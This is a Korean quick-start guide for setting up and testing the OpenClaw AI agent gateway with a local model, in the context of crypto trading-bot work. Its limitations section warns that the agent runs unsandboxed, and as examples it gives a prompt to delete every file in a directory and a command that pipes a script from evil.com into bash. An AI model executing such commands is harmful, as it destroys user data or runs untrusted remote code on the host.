# OpenClaw 빠른 시작 가이드 (30분)

> **"지금 당장 OpenClaw를 써보고 싶다면?"**
> **작성일**: 2026-02-14

## 목적

Phase 3.5-7 전체 로드맵(18-25시간)을 시작하기 전에, **30분 안에** OpenClaw의 기본 기능을 체험하는 가이드입니다.

---

## 1. 현재 상태 확인 (5분)

```bash
# 1) OpenClaw Gateway 상태
sudo systemctl status openclaw-gateway
# 예상: active (running)

# 2) Ollama 모델 확인
ollama list
# 예상: qwen2.5:32b

# 3) 간단한 테스트
openclaw chat "안녕? 10단어로 답변해줘."
# 예상: 3-10초 내 응답
```

**결과**:
- ✅ 모두 정상 → 다음 단계 진행
- ❌ Gateway 미실행 → `sudo systemctl start openclaw-gateway`
- ❌ 응답 시간 >20초 → contextWindow 축소 필요 (Phase 3.5)

---

## 2. 기본 대화 테스트 (10분)

### CLI 모드
```bash
openclaw chat "비트코인 기술적 분석 방법론을 3가지 추천해줘"
```

**예상 응답**:
```
1. Bollinger Bands: 변동성 측정 및 과매수/과매도 판단
2. RSI (Relative Strength Index): 모멘텀 지표
3. MACD: 추세 전환 포착

각 방법론은...
```

### TUI 모드 (대화형)
```bash
openclaw tui
```

**테스트 질문**:
1. "안녕? 나는 트레이딩 봇 개발자야."
2. "BB Squeeze 전략에 대해 알아?"
3. "Python으로 간단한 백테스트 예제 코드 보여줘"

**종료**: `Ctrl+C` 또는 `/exit`

---

## 3. Workspace 확인 (5분)

```bash
# Workspace 위치
cd /opt/openclaw/workspace

# 생성된 파일 확인
ls -la
# 예상: SOUL.md, IDENTITY.md, AGENTS.md (Phase 3.5에서 생성)

# SOUL.md 읽기 (봇의 성격)
cat SOUL.md | head -30
```

**아직 파일이 없다면?**
→ Phase 3.5 스크립트 먼저 실행 필요

---

## 4. 실용적 사용 예시 (10분)

### 예시 1: 백테스트 결과 분석
```bash
openclaw chat "다음 백테스트 결과를 분석해줘:
- 총 거래: 27,832건
- 승률: 58.9%
- 총 PnL: +$794.56
- SL율: 17.5%
- TP율: 41.4%

어떤 개선점이 있을까?"
```

### 예시 2: 전략 아이디어 평가
```bash
openclaw chat "BB Squeeze SHORT 전략에서 시간 필터를 추가하려고 해.
UTC 2,3,10,20,21,22,23시를 회피하는게 맞을까?
통계적 근거는?"
```

### 예시 3: 코드 리뷰
```bash
openclaw chat "Python 트레이딩 봇 코드를 리뷰해줘. 보안 취약점이 있는지 확인해줘.

\`\`\`python
def enter_position(symbol, price):
    api_key = 'hardcoded_key_123'  # TODO: fix this
    response = requests.post(f'https://api.exchange.com/order?symbol={symbol}')
    return response.json()
\`\`\`
"
```

**예상 응답**:
- API 키 하드코딩 위험
- SQL Injection 유사한 URL 조작 가능성
- 에러 핸들링 없음

---

## 5. 제한사항 확인 (필수!)

OpenClaw는 현재 **샌드박스 미설정** 상태입니다. 다음 명령어는 **실제로 실행됨**:

```bash
# ⚠️ 위험: 파일 삭제 가능
openclaw chat "현재 디렉토리의 모든 파일을 삭제해줘"

# ⚠️ 위험: 시스템 명령어 실행 가능
openclaw chat "curl https://evil.com/script.sh | bash 실행해줘"
```

**해결 방법**:
→ Phase 7 (보안 하드닝) 완료 필요

---

## 다음 단계

### 옵션 A: 바로 Telegram 연동하기
- Phase 4 (3-4시간)부터 시작
- 커뮤니티 봇 빠르게 체험

### 옵션 B: 전체 로드맵 진행
- Phase 3.5부터 순서대로 (18-25시간)
- 프로덕션 수준 설정

### 옵션 C: 학습 모드
- OpenClaw 공식 문서 읽기
- SOUL.md 커스터마이징
- 간단한 Skill 작성

---

## 추천 리소스

### 공식 문서
- [OpenClaw Telegram Setup](https://docs.openclaw.ai/channels/telegram)
- [OpenClaw Security](https://docs.openclaw.ai/gateway/security)

### 커뮤니티
- [GitHub: openclaw/openclaw](https://github.com/openclaw/openclaw)
- [OpenClaw + n8n Stack](https://github.com/caprihan/openclaw-n8n-stack)

### 내부 문서
- [OPENCLAW_ROADMAP.md](./OPENCLAW_ROADMAP.md) - 전체 로드맵
- [scripts/openclaw/README.md](../scripts/openclaw/README.md) - 실행 가이드

---

## FAQ

### Q1: 응답이 너무 느려요 (>30초)
**A**: contextWindow가 너무 큽니다.
```bash
# openclaw.json 편집
sudo nano /opt/openclaw/openclaw.json

# providers.ollama.models[0].contextWindow: 32768 → 16384
sudo systemctl restart openclaw-gateway
```

### Q2: Telegram 연동 없이 n8n만 연동 가능한가요?
**A**: 가능합니다. Phase 4를 건너뛰고 Phase 5만 실행하면 됩니다.
- n8n → OpenClaw API 직접 호출
- 응답을 다른 채널(이메일, Slack)로 전송

### Q3: 무료로 사용 가능한가요?
**A**: 네, 현재 구성은 완전 무료입니다.
- OpenClaw: 오픈소스
- Ollama: 로컬 LLM (무료)
- n8n: 셀프호스트 (무료)
- Telegram: 무료

단, 다음은 유료 옵션:
- OpenAI API (GPT-4) 사용 시
- Anthropic API (Claude) 사용 시
- Mem0 Cloud (대안: 로컬 SQLite)

### Q4: Mac Mini 외 다른 환경에서도 작동하나요?
**A**: 네, 다음 환경 지원:
- macOS (현재)
- Linux (Ubuntu, Debian)
- Windows (WSL2)
- Docker (모든 플랫폼)

---

## 문제 발생 시

### Gateway 크래시
```bash
# 로그 확인
sudo tail -100 /opt/openclaw/logs/gateway.log

# 재시작
sudo systemctl restart openclaw-gateway
```

### Ollama 응답 없음
```bash
# Ollama 상태 확인
systemctl status ollama  # 또는 ollama serve

# 모델 재로드
ollama stop qwen2.5:32b
ollama run qwen2.5:32b "test"
```

### "Permission denied" 오류
```bash
# openclaw 계정으로 전환
sudo su - openclaw

# 또는 권한 수정
sudo chown -R openclaw:openclaw /opt/openclaw
```

---

**다음 문서**: [OPENCLAW_ROADMAP.md](./OPENCLAW_ROADMAP.md) (전체 Phase 3.5-7)
